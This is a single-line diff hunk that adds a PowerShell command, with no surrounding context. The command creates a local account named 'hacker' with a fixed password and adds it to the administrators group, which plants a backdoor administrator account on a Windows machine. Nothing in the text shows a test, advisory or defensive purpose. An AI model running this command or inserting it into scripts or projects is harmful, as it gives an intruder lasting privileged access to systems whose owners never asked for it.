@@ -1,0 +1,1 @@
+powershell -Command "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
